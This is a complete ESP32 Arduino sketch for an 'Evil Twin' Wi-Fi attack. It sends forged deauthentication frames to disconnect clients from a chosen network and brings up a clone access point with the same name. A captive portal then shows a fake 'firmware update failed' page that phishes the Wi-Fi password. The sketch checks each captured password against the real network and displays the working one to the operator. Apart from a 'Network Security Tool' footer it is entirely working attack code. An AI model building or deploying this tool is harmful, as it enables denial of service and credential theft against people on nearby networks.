#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "⚠️ Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "*{margin:0;padding:0;box-sizing:border-box;}"
               "html,body{width:100%;height:100%;}"
               "body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;color:#333;}"
               "nav{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:1.5rem 1rem;box-shadow:0 4px 15px rgba(0,0,0,0.2);}"
               "nav b{display:block;font-size:1.5em;margin-bottom:0.3em;font-weight:bold;word-wrap:break-word;}"
               "nav span{font-size:0.85em;opacity:0.9;display:block;word-wrap:break-word;}"
               ".container{max-width:100%;margin:1rem auto;padding:0 0.75rem;}"
               ".card{background:#fff;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.15);padding:1.5rem;margin-bottom:2rem;}"
               "h1{color:#667eea;font-size:1.5rem;margin-bottom:1rem;text-align:center;word-wrap:break-word;}"
               "h3{color:#764ba2;margin-top:1.5rem;margin-bottom:0.5rem;}"
               "input[type='password'],input[type='text']{width:100%;padding:12px 15px;margin:10px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:1rem;transition:.3s;}"
               "input[type='password']:focus,input[type='text']:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}"
               "button{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:12px 24px;border:none;border-radius:8px;font-size:0.95rem;font-weight:bold;cursor:pointer;transition:.3s;margin:8px 4px;box-shadow:0 4px 12px rgba(102,126,234,0.3);}"
               "button:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 16px rgba(102,126,234,0.4);}"
               "button:active{transform:translateY(0);}"
               "button:disabled{opacity:0.5;cursor:not-allowed;}"
               "button.stop{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);}"
               "button.select{background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);}"
               "button.success{background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);}"
               "table{width:100%;border-collapse:collapse;margin-top:1rem;font-size:0.9rem;}"
               "th{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:10px;text-align:left;font-weight:bold;}"
               "td{padding:10px;border-bottom:1px solid #e0e0e0;}"
               "tr:hover td{background:#f9f9f9;}"
               ".status{padding:1rem;border-radius:8px;margin-bottom:1rem;text-align:center;font-weight:bold;}"
               ".status.active{background:#d4edda;color:#155724;border:2px solid #28a745;}"
               ".status.inactive{background:#f8d7da;color:#721c24;border:2px solid #f5c6cb;}"
               ".button-group{display:flex;gap:0.5rem;flex-wrap:wrap;justify-content:center;margin:1rem 0;}"
               ".warning{color:#856404;background:#fff3cd;padding:1rem;border-radius:8px;margin-bottom:1rem;border-left:4px solid #ffc107;line-height:1.5;}"
               "label{display:block;font-weight:bold;margin-top:1rem;margin-bottom:0.5rem;color:#333;}"
               "form{margin:1rem 0;}"
               ".center{text-align:center;}"
               ".grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}"
               "footer{text-align:center;color:#fff;margin-top:2rem;padding:1.5rem;font-size:0.9rem;}"
               "@media(max-width:768px){nav{padding:1rem 0.75rem;}nav b{font-size:1.3em;}.container{margin:0.75rem auto;padding:0 0.5rem;}.card{padding:1rem;margin-bottom:1.5rem;}h1{font-size:1.3rem;}button{padding:10px 20px;font-size:0.9rem;margin:6px 2px;}table{font-size:0.85rem;}th,td{padding:8px;}}"
               "@media(max-width:480px){body{font-size:14px;}nav{padding:0.75rem 0.5rem;}nav b{font-size:1.2em;}.container{padding:0.5rem;}.card{padding:0.75rem;margin-bottom:1rem;}h1{font-size:1.2rem;margin-bottom:0.75rem;}button{width:100%;padding:12px;margin:6px 0;}.button-group{flex-direction:column;gap:0;margin:0.75rem 0;}table{font-size:0.75rem;width:100%;}th,td{padding:6px 4px;}input[type='password'],input[type='text']{font-size:16px;}.warning{padding:0.75rem;margin-bottom:0.75rem;}label{font-size:0.95rem;margin-top:0.75rem;}footer{padding:1rem;}}";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name='viewport' content='width=device-width,initial-scale=1'>"
             "<style>" + CSS + "</style>"
             "<meta charset='UTF-8'></head>"
             "<body><nav><b>🛡️ " + a + "</b><span>" + SUBTITLE + "</span></nav>"
             "<div class='container'><div class='card'>";
  return h;
}

String footer() {
  return "</div></div><footer><p>🔒 Network Security Tool | © 2026</p></footer></body></html>";
}

String index() {
  return header(TITLE) + 
         "<div class='warning'><strong>⚠️ Warning:</strong><br>" + BODY + "</div>"
         "<div style='text-align:center;'>"
         "<form action='/' method='post'>"
         "<label for='password'>🔐 Enter WiFi Password:</label>"
         "<input type='password' id='password' name='password' minlength='8' placeholder='Enter password...' required>"
         "<button type='submit' style='width:100%;margin-top:1rem;'>✓ Continue</button>"
         "</form>"
         "</div>" + footer();
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_34732", "d347h320");
  
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/close", handleClose);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  Serial.println("═══════════════════════════════════════");
  Serial.println("🛡️  ESP32 Evil Twin Deauth - Started");
  Serial.println("═══════════════════════════════════════");
  Serial.print("SoftAP: WiPhi_34732 | IP: ");
  Serial.println(WiFi.softAPIP());
  Serial.println("DNS Server: Started");
  Serial.println("Deauth Mode: Attempting frame injection");
  Serial.println("═══════════════════════════════════════");
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  int status = WiFi.status();
  
  Serial.print("[PASSWORD_CHECK] WiFi Status: ");
  Serial.println(status);
  Serial.print("[PASSWORD_CHECK] Target: ");
  Serial.println(_selectedNetwork.ssid);
  Serial.print("[PASSWORD_CHECK] Password: ");
  Serial.println(_tryPassword);
  
  if (status == WL_CONNECTED) {
    // ✅ PASSWORD CORRECT
    _correct = "✅ PASSWORD CAPTURED!<br><strong>" + _selectedNetwork.ssid + "</strong><br>" + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    
    Serial.println("[PASSWORD_CHECK] ✅ CORRECT PASSWORD!");
    Serial.println(_correct);
    
    String successHTML = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                        "<style>*{margin:0;padding:0;box-sizing:border-box;}"
                        "body{background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);min-height:100vh;font-family:'Segoe UI',sans-serif;padding:1rem;}"
                        ".container{max-width:600px;margin:2rem auto;background:#fff;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.2);padding:2rem;}"
                        ".icon{font-size:3em;text-align:center;margin-bottom:1rem;}"
                        "h1{color:#28a745;text-align:center;font-size:1.8em;margin-bottom:1.5rem;}"
                        ".info-box{background:#d4edda;border:2px solid #28a745;border-radius:8px;padding:1.5rem;margin:1rem 0;}"
                        ".label{font-weight:bold;color:#155724;font-size:0.95em;}"
                        ".value{font-family:monospace;background:#fff;padding:0.75rem;border-radius:4px;margin-top:0.5rem;word-break:break-all;border:1px solid #28a745;}"
                        "footer{text-align:center;margin-top:2rem;font-size:0.85em;color:#666;}"
                        "@media(max-width:480px){.container{padding:1rem;}h1{font-size:1.5em;}}"
                        "</style></head><body><div class='container'><div class='icon'>✅</div>"
                        "<h1>Password Captured!</h1>"
                        "<div class='info-box'>"
                        "<div class='label'>🌐 SSID:</div><div class='value'>" + _selectedNetwork.ssid + "</div>"
                        "<div class='label' style='margin-top:1rem;'>🔑 PASSWORD:</div><div class='value'>" + _tryPassword + "</div>"
                        "</div>"
                        "<footer><p>Credentials captured successfully</p></footer></div></body></html>";
    webServer.send(200, "text/html", successHTML);
    
  } else {
    // ❌ PASSWORD WRONG
    Serial.print("[PASSWORD_CHECK] ❌ WRONG PASSWORD! Status code: ");
    Serial.println(status);
    
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;color:#fff;}.msg-box{text-align:center;background:rgba(0,0,0,0.2);padding:2rem;border-radius:12px;max-width:90%;}.icon{font-size:4em;margin-bottom:1rem;}h2{font-size:1.5em;margin-bottom:0.5rem;}p{font-size:1em;}@media(max-width:480px){.msg-box{padding:1.5rem;}.icon{font-size:3em;}h2{font-size:1.2em;}}}</style><script>setTimeout(function(){window.location.href = '/';}, 4000);</script></head><body><div class='msg-box'><div class='icon'>❌</div><h2>Wrong Password</h2><p>Authentication failed.<br>Try again.</p></div></body></html>");
    Serial.println("[PASSWORD_CHECK] ❌ Wrong password tried!");
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                   "<style>"
                   "*{margin:0;padding:0;box-sizing:border-box;}"
                   "html,body{width:100%;height:100%;}"
                   "body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;font-family:'Segoe UI',sans-serif;color:#333;}"
                   "nav{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:1rem;box-shadow:0 4px 15px rgba(0,0,0,0.2);}"
                   "nav b{display:block;font-size:1.3em;margin-bottom:0.2em;font-weight:bold;word-wrap:break-word;}"
                   ".container{width:100%;margin:0.75rem auto;padding:0 0.5rem;}"
                   ".card{background:#fff;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.15);padding:1rem;}"
                   ".button-group{display:flex;gap:0.3rem;justify-content:center;margin-bottom:1rem;flex-wrap:wrap;}"
                   "button{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:9px 18px;border:none;border-radius:8px;font-size:0.85rem;font-weight:bold;cursor:pointer;transition:.3s;box-shadow:0 4px 12px rgba(102,126,234,0.3);"
                   "button:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 16px rgba(102,126,234,0.4);}"
                   "button:disabled{opacity:0.5;cursor:not-allowed;}"
                   "button.stop{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);}"
                   "table{width:100%;border-collapse:collapse;margin-top:0.75rem;font-size:0.85rem;}"
                   "th{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:8px;text-align:left;font-weight:bold;}"
                   "td{padding:8px;border-bottom:1px solid #e0e0e0;word-wrap:break-word;}"
                   "tr:hover td{background:#f9f9f9;}"
                   ".status{padding:0.75rem;border-radius:8px;margin-bottom:0.75rem;text-align:center;font-weight:bold;font-size:0.9rem;}"
                   ".status.active{background:#d4edda;color:#155724;border:2px solid #28a745;}"
                   ".status.inactive{background:#f8d7da;color:#721c24;border:2px solid #f5c6cb;}"
                   "h3{color:#667eea;margin:0.75rem 0 0.5rem 0;font-size:1em;}"
                   "footer{text-align:center;color:#fff;margin-top:1.5rem;padding:1rem;font-size:0.8rem;}"
                   "@media(max-width:768px){.button-group form{width:auto;}}"
                   "@media(max-width:480px){.button-group{flex-direction:column;gap:0;margin-bottom:0.5rem;}button{width:100%;padding:10px;margin:3px 0;font-size:0.9rem;}.button-group form{width:100%;}}"
                   "</style>"
                   "</head><body><nav><b>🛡️ Deauth</b></nav>"
                   "<div class='container'><div class='card'>"
                   "<div class='button-group'>"
                   "<form method='post' action='/?deauth={deauth}'>"
                   "<button class='{deauth_class}' {disabled_deauth}>{deauth_button}</button></form>"
                   "<form method='post' action='/?hotspot={hotspot}'>"
                   "<button class='{hotspot_class}' {disabled_hotspot}>{hotspot_button}</button></form>"
                   "</div>"
                   "<h3>📡 Networks</h3>"
                   "<table><tr><th>SSID</th><th>MAC</th><th>Ch</th><th>Act</th></tr>";


void handleIndex() {
  Serial.println("HTTP GET / or POST / (handleIndex)");

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
        Serial.print("Selected network: ");
        Serial.println(_selectedNetwork.ssid);
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      Serial.println("Deauth STARTED");
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      Serial.println("Deauth STOPPED");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      Serial.print("EvilTwin activated: ");
      Serial.println(_selectedNetwork.ssid);

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      Serial.println("EvilTwin deactivated");
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      String bssid_str = bytesToStr(_networks[i].bssid, 6);
      _html += "<tr><td><strong>" + _networks[i].ssid + "</strong></td><td><code style='font-size:0.85em;'>" + bssid_str + "</code></td><td><strong>" + String(_networks[i].ch) + "</strong></td><td><form style='display:inline;' method='post' action='/?ap=" + bssid_str + "'>";

      if (bssid_str == bytesToStr(_selectedNetwork.bssid, 6)) {
        _html += "<button class='success' style='background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);'>✓ Selected</button></form></td></tr>";
      } else {
        _html += "<button class='select' style='background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);'>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "⏹️ Stop Deauth");
      _html.replace("{deauth_class}", "stop");
      _html.replace("{deauth}", "stop");
      _html.replace("{disabled_deauth}", "");
    } else {
      _html.replace("{deauth_button}", "⚡ Start Deauth");
      _html.replace("{deauth_class}", "");
      _html.replace("{deauth}", "start");
      if (_selectedNetwork.ssid == "") {
        _html.replace("{disabled_deauth}", "disabled");
      } else {
        _html.replace("{disabled_deauth}", "");
      }
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "⏹️ Stop EvilTwin");
      _html.replace("{hotspot_class}", "stop");
      _html.replace("{hotspot}", "stop");
      _html.replace("{disabled_hotspot}", "");
    } else {
      _html.replace("{hotspot_button}", "📱 Start EvilTwin");
      _html.replace("{hotspot_class}", "");
      _html.replace("{hotspot}", "start");
      if (_selectedNetwork.ssid == "") {
        _html.replace("{disabled_hotspot}", "disabled");
      } else {
        _html.replace("{disabled_hotspot}", "");
      }
    }

    _html += "</table>";

    if (_selectedNetwork.ssid != "") {
      String status = "";
      if (deauthing_active) {
        status = "⚡ <strong style='color:#dc3545;'>Deauthing Active!</strong> - Sending deauth frames to <strong>" + _selectedNetwork.ssid + "</strong>";
      }
      if (hotspot_active) {
        status = "📱 <strong style='color:#17a2b8;'>EvilTwin Active!</strong> - Impersonating <strong>" + _selectedNetwork.ssid + "</strong>";
      }
      if (!deauthing_active && !hotspot_active && _selectedNetwork.ssid != "") {
        status = "✓ Network selected: <strong>" + _selectedNetwork.ssid + "</strong>";
      }
      
      if (status != "") {
        _html += "<div class='status active' style='margin-top:1.5rem;'>" + status + "</div>";
      }
    }

    if (_correct != "") {
      _html += "<h3 style='color:#28a745;margin-top:2rem;'>✓ Success!</h3><p>" + _correct + "</p>";
    }

    _html += "</div></div><footer style='text-align:center;color:#fff;margin-top:3rem;padding:2rem;'><p>🔒 Network Security Tool | © 2026</p></footer></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      
      Serial.println("");
      Serial.println("═══════════════════════════════════════");
      Serial.println("[PASSWORD SUBMISSION] Attempting connection...");
      Serial.print("[PASSWORD SUBMISSION] Network: ");
      Serial.println(_selectedNetwork.ssid);
      Serial.print("[PASSWORD SUBMISSION] Password: ");
      Serial.println(_tryPassword);
      Serial.print("[PASSWORD SUBMISSION] Channel: ");
      Serial.println(_selectedNetwork.ch);
      Serial.println("═══════════════════════════════════════");
      
      delay(1000);
      WiFi.disconnect();
      delay(500);
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      
      Serial.println("[PASSWORD SUBMISSION] WiFi.begin() called - waiting for connection...");
      
      // Send page with LONGER timeout (30 seconds instead of 15)
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;color:#fff;}.loader{text-align:center;padding:2rem;max-width:90%;}h2{font-size:1.8em;margin-bottom:1rem;word-wrap:break-word;}p{font-size:1.1em;margin-bottom:1.5rem;}progress{width:80%;max-width:300px;height:20px;border-radius:10px;}.note{font-size:0.9em;opacity:0.8;margin-top:1rem;}@media(max-width:480px){.loader{padding:1rem;}h2{font-size:1.3em;margin-bottom:0.75rem;}progress{max-width:200px;}}</style></head><script>setTimeout(function(){window.location.href = '/result';}, 30000);</script><body><div class='loader'><h2>⏳ Authenticating...</h2><p>Attempting to connect to network...</p><progress value='10' max='100'>10%</progress><div class='note'>This may take up to 30 seconds</div></div></body></html>");
      
      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    String bssid_str = bytesToStr(_networks[i].bssid, 6);
    _html += "<tr><td><strong>" + _networks[i].ssid + "</strong></td><td><code style='font-size:0.85em;'>" + bssid_str + "</code></td><td><strong>" + String(_networks[i].ch) + "</strong></td><td><form style='display:inline;' method='post' action='/?ap=" + bssid_str + "'>";

    if ( bssid_str == bytesToStr(_selectedNetwork.bssid, 6)) {
      _html += "<button class='success' style='background:linear-gradient(135deg,#43e97b 0%,#38f9d7 100%);'>✓ Selected</button></form></td></tr>";
    } else {
      _html += "<button class='select' style='background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);'>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "⏹️ Stop Deauth");
    _html.replace("{deauth_class}", "stop");
    _html.replace("{deauth}", "stop");
    _html.replace("{disabled_deauth}", "");
  } else {
    _html.replace("{deauth_button}", "⚡ Start Deauth");
    _html.replace("{deauth_class}", "");
    _html.replace("{deauth}", "start");
    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled_deauth}", "disabled");
    } else {
      _html.replace("{disabled_deauth}", "");
    }
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "⏹️ Stop EvilTwin");
    _html.replace("{hotspot_class}", "stop");
    _html.replace("{hotspot}", "stop");
    _html.replace("{disabled_hotspot}", "");
  } else {
    _html.replace("{hotspot_button}", "📱 Start EvilTwin");
    _html.replace("{hotspot_class}", "");
    _html.replace("{hotspot}", "start");
    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled_hotspot}", "disabled");
    } else {
      _html.replace("{disabled_hotspot}", "");
    }
  }

  _html += "</table>";

  if (_correct != "") {
    _html += "<h3 style='color:#28a745;margin-top:2rem;'>✓ Success!</h3><p>" + _correct + "</p>";
  }

  _html += "</div></div><footer style='text-align:center;color:#fff;margin-top:3rem;padding:2rem;'><p>🔒 Network Security Tool | © 2026</p></footer></body></html>";
  webServer.send(200, "text/html", _html);

}

void handleClose() {
  Serial.println("");
  Serial.println("═══════════════════════════════════════");
  Serial.println("🔄 SYSTEM RESET INITIATED");
  Serial.println("═══════════════════════════════════════");
  
  // ┌─ STEP 1: Stop all active operations
  Serial.println("[RESET] Stopping active operations...");
  deauthing_active = false;
  hotspot_active = false;
  
  // ┌─ STEP 2: Stop network services
  Serial.println("[RESET] Stopping DNS server...");
  dnsServer.stop();
  
  Serial.println("[RESET] Disconnecting from soft AP...");
  WiFi.softAPdisconnect(true);
  
  // ┌─ STEP 3: Clear all state variables
  Serial.println("[RESET] Clearing all variables...");
  clearArray();
  _selectedNetwork.ssid = "";
  _selectedNetwork.ch = 0;
  for (int i = 0; i < 6; i++) {
    _selectedNetwork.bssid[i] = 0;
  }
  _correct = "";
  _tryPassword = "";
  
  // ┌─ STEP 4: Reset WiFi to initial state
  Serial.println("[RESET] Resetting WiFi configuration...");
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP_STA);
  delay(100);
  
  // ┌─ STEP 5: Reconfigure soft AP with default settings
  Serial.println("[RESET] Reconfiguring soft AP...");
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_34732", "d347h320");
  
  // ┌─ STEP 6: Start DNS server
  Serial.println("[RESET] Starting DNS server...");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
  
  // ┌─ STEP 7: Perform initial network scan
  Serial.println("[RESET] Scanning networks...");
  performScan();
  
  Serial.println("[RESET] System ready for new session");
  Serial.println("═══════════════════════════════════════");
  Serial.println("");
  
  // Send success response with auto-refresh
  String response = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                    "<style>*{margin:0;padding:0;box-sizing:border-box;}"
                    "body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;color:#fff;}"
                    ".container{text-align:center;background:rgba(0,0,0,0.2);padding:2.5rem;border-radius:12px;max-width:90%;}"
                    ".icon{font-size:4em;margin-bottom:1rem;animation:spin 2s linear infinite;}"
                    "@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}"
                    "h2{font-size:1.6em;margin-bottom:0.5rem;font-weight:bold;}"
                    ".status{font-size:1em;margin-bottom:1rem;opacity:0.9;}"
                    ".spinner{display:inline-block;width:40px;height:40px;border:4px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin-top:1rem;}"
                    "p{font-size:0.95em;margin-top:1rem;}"
                    "@media(max-width:480px){.container{padding:2rem;}.icon{font-size:3em;}h2{font-size:1.3em;} .spinner{width:30px;height:30px;}}"
                    "</style><script>setTimeout(function(){window.location.href = '/';}, 4000);</script>"
                    "</head><body><div class='container'><div class='icon'>✓</div><h2>System Reset Complete</h2>"
                    "<div class='status'>🔄 All configurations cleared</div>"
                    "<div class='status'>📡 Networks rescanned</div>"
                    "<div class='status'>⚙️ Ready for new session</div>"
                    "<div class='spinner'></div><p>Redirecting to main page...</p></div></body></html>";
  
  webServer.send(200, "text/html", response);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
int _lastStationNum = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void sendDeauthFrame(uint8_t* target_bssid, uint8_t* dest_addr) {
  uint8_t deauthPacket[26];
  
  // Frame control: type=management(0), subtype=deauth (0xC0)
  deauthPacket[0] = 0xC0;
  deauthPacket[1] = 0x00;
  
  // Duration/ID
  deauthPacket[2] = 0x3a;
  deauthPacket[3] = 0x01;
  
  // Addr1: destination (target client or broadcast)
  for (int i = 0; i < 6; ++i) deauthPacket[4 + i] = dest_addr[i];
  
  // Addr2: source (target AP BSSID)
  for (int i = 0; i < 6; ++i) deauthPacket[10 + i] = target_bssid[i];
  
  // Addr3: BSSID
  for (int i = 0; i < 6; ++i) deauthPacket[16 + i] = target_bssid[i];
  
  // Sequence control
  deauthPacket[22] = 0x00;
  deauthPacket[23] = 0x00;
  
  // Reason code (1 = unspecified)
  deauthPacket[24] = 0x01;
  deauthPacket[25] = 0x00;
  
  // Try sending from STA interface for better compatibility
  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  
  if (res == ESP_OK) {
    Serial.print("[DEAUTH_TX] Frame sent successfully | AP: ");
    Serial.println(_selectedNetwork.ssid);
  } else if (res == 258) {
    Serial.println("[DEAUTH_ERR] Driver rejected frame - Mode not supported");
  } else {
    Serial.print("[DEAUTH_ERR] Failed with code: ");
    Serial.println(res);
  }
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 500) {
      int channel = _selectedNetwork.ch;
      if (channel >= 1 && channel <= 13) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      }

      // Try sending deauth frames to disconnect clients
      Serial.print("[DEAUTH] Attempting on channel ");
      Serial.print(channel);
      Serial.print(" | Target: ");
      Serial.println(_selectedNetwork.ssid);
      
      // Send multiple deauth frames to ensure effectiveness
      for (int i = 0; i < 3; i++) {
        // Send broadcast deauth (affects all clients)
        sendDeauthFrame(_selectedNetwork.bssid, broadcast);
        delay(5);
      }

      deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("[WIFI] Not connected to target");
    } else {
      Serial.println("[WIFI] Connected to target");
    }
    // check softAP station count and log changes
    int st = WiFi.softAPgetStationNum();
    if (st != _lastStationNum) {
      Serial.print("[AP] Stations connected: ");
      Serial.println(st);
      _lastStationNum = st;
    }
    wifinow = millis();
  }
}
